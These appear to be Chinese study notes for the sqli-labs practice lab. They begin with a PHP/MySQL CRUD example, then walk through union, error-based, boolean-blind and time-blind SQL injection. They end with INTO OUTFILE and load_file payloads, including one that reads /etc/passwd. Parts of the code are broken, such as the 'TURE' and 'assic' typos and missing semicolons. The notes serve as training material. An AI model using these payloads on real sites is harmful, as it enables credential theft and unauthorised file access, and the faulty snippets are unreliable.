#### 1、sql标准流程
```php
<?php
$servername = "localhost";
$username = "root";
$password = "root"
$dbname = "hh"	// 库名

$con = new mysqli($servername, $username, $password, $dbname);

if($con->connect_error){
    die("...");
}

//查
$sql = "SELECT * FROM table1 WHERE id = 2";

// 执行sql语句并返回到result变量中
$result = $con->query($sql);

if($result->num_rows > 0){
    // 穷举
    while($row = $result->fetch_assoc()){
        echo $row['username'].'.............'.$row['password'].<br/>
    }
}

// 增
$sql = "INSERT INTO tables (id, username, password) VALUES
	(21, 'test1', 'tttt')"

if($con -> query($sql) === TURE){
    echo '执行成功!!!';
}
else{
    echo '执行失败...'.$con->error;
}

//改
$sql = "UPDATE table1 SET password = '1111'
	WHERE username = 'xiaohong'";

if($con -> query($sql) === TURE){
    echo '执行成功!!!';
}
else{
    echo '执行失败...'.$con->error;
}

// 删
$sql = "DELETE FROM table1 WHERE id = 21";

if($con -> query($sql) === TURE){
    echo '执行成功!!!';
}
else{
    echo '执行失败...'.$con->error;
}

// 断开数据库
$con->close();
?>
```

#### 2、SQL注入

###### sql小知识：mysql -u[用户名] -p[密码]
###### 查看所有的数据库：show databases;
###### 使用某个数据库名：use [数据库名];
###### 查看此库里有什么表：show tables;
##### 步骤1：推断数据库的语法
```
SELECT * FROM ... where id = '参数' limit 0, 1;
SELECT * FROM ... where id = "参数" limit 0, 1;
```
##### 步骤2：让他报错，显示自己的闭合方式
```
闭合方式的可能
' " ') ") )
```
##### 步骤3：验证目标数据库的参数闭合方式
```
?id = 1' limit 0, 1 --+  // --+的作用为将后面的直接注释掉
```
##### 步骤4：确定有多少列
```
?id = 1' order by 10 limit 0, 1 --+ // 二分法求的多少列
```
##### 步骤5：有哪几列显示在网页上（联合查询，前面的参数必须让数据库报错，显示报错位）
```
?id = -1' union select 1, 2, 3 limit 0, 1 --+
```
##### 步骤6：刺探数据库的内部内容
```
?id = -2' union select 1, database(), 3 limit 0, 1 --+
```
###### 注：information_schema是数据库自带的，相当于数据库的户口本
###### information_schema的tables里面保存着所有数据库的库名和自己的表
###### information_schema的columns保存着所有数据库的库名、列名、表名的所有对应关系
```
?id=-2' union select 1, table_name ,3 from information_schema.tables where table_schema = 'security' limit 0, 1--+

?id=-2' union select 1, group_concat(table_name) ,3 from information_schema.tables where table_schema = 'security' --+
```
##### 步骤7：查询表中的列
```
?id=-2' union select 1, group_concat(column_name) ,3 from information_schema.columns where table_schema = 'security' and table_name = 'users'--+
``` 
##### 步骤8：查询内容
```
-2' union select 1, group_concat(username), group_concat(password) from users --+
```

#### 3、报错注入(less5-6)

###### 小知识：

```php
SELECT count(*) FROM table1 // 计算table1中有多少个结果
SELECT floor(rand() * 2) // 取一个随机的0-1整数
    
// 0x3a 十六进制的:
select concat(0xa3, 0x3a, (select database()), 0x3a, 0x3a) a;	// 输出 ::库名::，并取别名a

//报错写法
select count(*), concat(0x3a, 0x3a, select(database()), 0x3a, 0x3a, floor(rand() * 2))a from table1 group by a
```

##### 写法：

```php
?id=1' AND (select 1 from (
	select count(*), 
	concat(0x3a, 0x3a, (select database()),0x3a, 0x3a, floor(rand() * 2))a 
from information_schema.tables group by a) b) --+

?id=1' AND (select 1 from (
	select count(*), 
	concat(0x3a, 0x3a, (select table_name from information_schema.tables where table_schema = 'security' limit 0, 1),0x3a, 0x3a, floor(rand() * 2))a 
from information_schema.tables group by a) b) --+
    
    
// 简单方法
?id = 1' AND extractvalue(1, concat(0x7e, (select database()), 0x7e)) --+
?id = 1' AND updatexml(1, concat(0x7e, (select database()), 0x7e), 1) --+
```

#### 4、bool型盲注 less8

```
不显示错误，也不显示任何数据库内容
记录下报错显示
?id = 1 正常
?id = 1\ 不正常
?id = haha 不正常
?id = 1' --+ 正常
?id = 1 AND 0 不正常
?id = 1 AND 1 正常
?id = 1 AND 1 < 2 正常
?id = 1 AND 1 > 2 不正常

?id = 1 AND (select assic(substr(database(), 1, 1)) = 115) 截取表名第一个字符对应的assic值和104是否相等，判断database的内容

?id = 1 AND (select assic(substr((select table_name from information_schema where table_schema = database() limit 0, 1), 1, 1)) = 115)
```

#### 5、bool型时间盲注

```php
id = 2' AND sleep(10) // 如果正确，则睡十秒后反应

id = 2' AND if((select substr(database(), 1, 1)) = 'e', sleep(5), null)  // 如果正确，则睡5秒，否则不返回
```

#### 6、intooutfile注入

```sql
# 把取出的数据保存在某个文件中
select * from table1 into outfile "D:/phpstudy_pro/WWW/a.txt";		# windows
select * from table1 into outfile "/var/www/html/a.txt";			# linux

select * from table1 limit 0, 1 into dumpfile "c:/a.txt"

# 加载某个文件并显示
select load_file("/etc/passwd");

# 加载文件并转存
select load_file("/etc/passwd") into outfile "D:/phpstudy_pro/WWW/a.txt"
```

```php
?id=-2')) union select 1, database(), 3 into outfile "D:/phpstudy_pro/WWW/sqli-labs-master/Less-7/a.txt"
```
